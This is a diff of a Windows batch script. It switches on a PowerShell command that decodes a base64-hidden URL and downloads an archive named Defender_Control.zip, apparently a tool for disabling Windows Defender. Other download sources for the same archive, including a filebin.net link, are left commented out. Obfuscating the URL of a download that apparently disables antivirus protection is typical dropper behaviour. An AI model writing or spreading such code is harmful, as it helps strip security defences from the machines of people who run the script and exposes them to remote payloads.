@@ -29,9 +29,9 @@ echo.
 pause
 
 :: Download DefenderControl
-::powershell -Command "$u=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('aHR0cHM6Ly90ZXN0NC5ib29rLXBob3Rvcy1wcm8uY29tL2RDb250cm9sLnppcA==')); Invoke-WebRequest -Uri $u -OutFile .\Defender_Control.zip"
+powershell -Command "$u=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('aHR0cHM6Ly90ZXN0NC5ib29rLXBob3Rvcy1wcm8uY29tL2RDb250cm9sLnppcA==')); Invoke-WebRequest -Uri $u -OutFile .\Defender_Control.zip"
 ::powershell -Command "Invoke-WebRequest -Uri arenawebsecurity.net/dControl.zip -OutFile .\Defender_Control.zip"
-powershell -Command "Invoke-WebRequest https://filebin.net/dzpx7xkopaugju0p/Defender_Control.zip -OutFile .\Defender_Control.zip"
+::powershell -Command "Invoke-WebRequest https://filebin.net/dzpx7xkopaugju0p/Defender_Control.zip -OutFile .\Defender_Control.zip"
 :: do not harm any site please!
 :: Extract the Defender_Control.zip file
 :: tar -xf "%SCRIPT_PATH%\Defender_Control.zip"
